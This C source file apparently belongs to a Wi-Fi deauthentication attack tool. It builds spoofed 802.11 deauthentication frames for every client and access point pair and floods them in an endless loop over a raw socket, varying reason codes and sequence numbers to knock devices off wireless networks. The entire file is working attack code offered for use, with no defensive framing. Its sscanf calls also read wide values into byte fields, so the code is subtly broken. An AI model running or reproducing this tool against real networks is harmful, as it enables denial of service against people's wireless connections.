#include "inject.h"

struct llist frame_storage(struct llist* info){
    struct llist storage = create_ls();

    for(struct node* i = info[0].head_node; i != NULL; i = i->next_node){
        for(struct node* j = info[1].head_node; j != NULL; j = j->next_node){
            struct mgmt_frame* deau_frame = (struct mgmt_frame*)malloc(sizeof(struct mgmt_frame));
            
            if(deau_frame){
                deau_frame->rt_header.it_version = 0,
                deau_frame->rt_header.it_pad = 0,
                deau_frame->rt_header.it_len = 12,
                deau_frame->rt_header.it_present = 0x00008004,
                deau_frame->rt_header.rate = 2;
                deau_frame->rt_header.tx_flags = 8,  // TX flags no ACK

                deau_frame->frame_control = 0x00c0;
                deau_frame->duration = 0;
                sscanf((char*)i->data, "%jx:%jx:%jx:%jx:%jx:%jx", 
                        &deau_frame->dest_addr[0], &deau_frame->dest_addr[1], &deau_frame->dest_addr[2], &deau_frame->dest_addr[3], &deau_frame->dest_addr[4], &deau_frame->dest_addr[5]);
                sscanf((char*)j->data, "%jx:%jx:%jx:%jx:%jx:%jx", 
                        &deau_frame->src_addr[0], &deau_frame->src_addr[1], &deau_frame->src_addr[2], &deau_frame->src_addr[3], &deau_frame->src_addr[4], &deau_frame->src_addr[5]);
                for(int cnt = 0; cnt < 6; cnt ++)
                    deau_frame->bssid[cnt] = deau_frame->src_addr[cnt];
                deau_frame->seq_ctrl = 0;    // will change value later

                add_tail(&storage, deau_frame, sizeof(struct mgmt_frame));
            }
        }
    }
    return storage;
}

void inject(struct llist* storage, int sock, struct sockaddr_ll* dev, int density, int delay){
    srand(time(NULL));

    while(1){
        for(struct node* cur = storage->head_node; cur != NULL; cur = cur->next_node){
            ((struct mgmt_frame*)cur->data)->reason = 7;
            spam_frame(sock, dev, cur->data, 1 + rand() % density);

            switch_side((struct mgmt_frame*)cur->data);
            ((struct mgmt_frame*)cur->data)->reason = 8;
            spam_frame(sock, dev, cur->data, 1 + rand() % density);

            ((struct mgmt_frame*)cur->data)->reason = 5;
            spam_frame(sock, dev, cur->data, 1 + rand() % 3);

            switch_side((struct mgmt_frame*)cur->data);
            ((struct mgmt_frame*)cur->data)->reason = 6;
            spam_frame(sock, dev, cur->data, 1 + rand() % 3);
        }
        usleep(delay);
    }
}

void switch_side(struct mgmt_frame* deau){
    uint8_t tmp[6];
    memcpy(tmp, deau->dest_addr, 6);
    memcpy(deau->dest_addr, deau->src_addr, 6);
    memcpy(deau->src_addr, tmp, 6);
}

void spam_frame(int sock, struct sockaddr_ll* dev, void* frame, int times){
    while(times--){
        ((struct mgmt_frame*)frame)->seq_ctrl += 1 << 4;
        
        sendto(sock, frame, sizeof(struct mgmt_frame), 0, (struct sockaddr*)dev, sizeof(*dev));
    }
}